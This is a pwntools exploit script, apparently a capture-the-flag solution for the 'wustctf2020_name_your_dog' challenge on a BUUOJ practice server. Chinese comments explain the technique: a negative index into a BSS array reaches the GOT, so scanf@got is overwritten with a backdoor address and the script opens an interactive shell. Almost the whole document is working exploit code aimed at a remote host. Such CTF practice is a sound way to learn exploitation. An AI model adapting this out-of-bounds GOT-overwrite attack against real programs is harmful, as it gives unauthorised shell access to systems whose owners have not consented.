from pwn import *

# r = process('./wustctf2020_name_your_dog')
r = remote('node5.buuoj.cn', 27686)
elf = ELF('./wustctf2020_name_your_dog')
# r = remote('node5.buuoj.cn', 25318)
context.log_level = 'debug'

shell_addr = 0x80485CB
dog_bss = 0x804A060
print(f"printf@got ~ dog_bss: {elf.got['printf'] - dog_bss}")  # -84
print(f"scanf@got ~ dog_bss: {elf.got['__isoc99_scanf'] - dog_bss}")  # -56

r.recvuntil(b'them?')
r.sendlineafter(b'>', b'-7')
r.sendlineafter(b'plz: ', p32(shell_addr))
r.interactive()

'''
dog数组大小为0x34，在bss上，且开启了canary保护。没有什么可以溢出的地方
发现dog在bss上离got表地址很近，算一下两者的距离并利用数组越界即可通过scanf("7%s")修改got的地址
printf@got距离为-84，不是8的倍数；scanf@got距离为56，刚好是-56/8=-7
修改scanf@got为后门的地址，并且在第二次循环时会调用scanf函数完成利用
'''